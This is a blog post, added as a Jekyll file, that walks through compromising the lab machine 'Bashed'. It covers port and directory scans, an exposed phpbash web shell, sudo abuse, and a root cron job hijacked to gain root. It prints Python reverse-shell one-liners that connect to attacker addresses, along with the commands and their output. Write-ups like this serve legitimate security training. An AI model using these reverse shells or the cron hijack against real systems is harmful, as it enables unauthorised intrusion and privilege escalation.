@@ -1,0 +1,144 @@
+---
+layout: post
+title:  "Bashed"
+date:   2023-10-28 07:15:30 -0400
+categories: jekyll update
+---
+
+
+Bashed
+
+Was an easy box up to the tricky priv esc but finally got the root.
+
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame/CVE-2007-2447]
+└─# nmap -sC -sV -Pn 10.10.10.68
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 05:07 EDT
+Nmap scan report for 10.10.10.68
+Host is up (0.055s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+```
+Not much there so ran an all port scan `-p`:
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame/CVE-2007-2447]
+└─# nmap -p- -Pn 10.10.10.68
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 05:07 EDT
+Nmap scan report for 10.10.10.68
+Host is up (0.039s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+```
+Not much of a difference so I check out the web server at port 80, not much there. I run gobuster:
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame/CVE-2007-2447]
+└─# gobuster dir -u 10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.68
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 290]
+/.htaccess            (Status: 403) [Size: 295]
+/.htpasswd            (Status: 403) [Size: 295]
+/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
+/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
+/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
+/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
+/index.html           (Status: 200) [Size: 7743]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
+/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
+/server-status        (Status: 403) [Size: 299]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+==============================================================
+```
+First thing pops out at me is the `/dev` domain. So I check it out and its a phpbash web shell. I obtain the user flag:
+```
+www-data@bashed:/var/www/html/dev# whoami
+www-data  
+www-data@bashed:/var/www/html/dev# cd ..
+www-data@bashed:/var/www/html# cd ..
+www-data@bashed:/var/www# cd ..
+www-data@bashed:/var# cd ..
+www-data@bashed:/# ls
+<snip>
+www-data@bashed:/# cd home
+www-data@bashed:/home# ls
+arrexel  
+scriptmanager  
+www-data@bashed:/home# cd arrexel
+www-data@bashed:/home/arrexel# cat user.txt
+82d****************************
+```
+I tried sudo -l and it returned that scriptmanager is able to run sudo without a password. I was unable to switch to the user so I looked for a reverse shell one-liner. I found this:
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+Stabilized my shell: `python -c "import pty;pty.spawn('/bin/bash')"`
+I ran the command: `sudo -u scriptmanager /bin/bash`
+```
+$ python -c "import pty;pty.spawn('/bin/bash')"
+www-data@bashed:/$ sudo -u scriptmanager /bin/bash
+sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/$ whoami
+whoami
+scriptmanager
+scriptmanager@bashed:/$ 
+```
+I noticed the folder `scripts` in the root directory and checked it out. It has 2 files:
+```
+scriptmanager@bashed:/scripts$ ls -la
+ls -la
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
+drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+-rw-r--r--  1 root          root            12 Oct 28 02:55 test.txt
+```
+Root owns test.txt and the time its "created" keeps changing, which makes me to believe its a cron job. The test.py file writes to the test.txt:
+```
+scriptmanager@bashed:/scripts$ cat test.py
+cat test.py
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+```
+I will replace this file and put a reverse shell one-liner into it so when the cron job runs, which is owned by root, will hopefully give us an elevated session back. On the target machine I enter this command to create a new file:
+```
+scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > exploit.py
+<o(),2);p=subprocess.call(["/bin/sh","-i"]);' > test2.py
+```
+I set up a nc listener and as soon as I do I get a shell.
+```
+┌──(kali💀kali)-[~]
+└─$ nc -nlvp 1235 
+listening on [any] 1235 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.68] 58710
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+```
+I was going to change the name of the original test.py to something else and change the new file I just created to test.py. Apparently the cron job is set up to run all .py files as root in the scripts directory. I went ahead and grabbed the root flag.
+```
+# cd root
+# ls
+root.txt
+# cat root.txt
+42*************************
+```
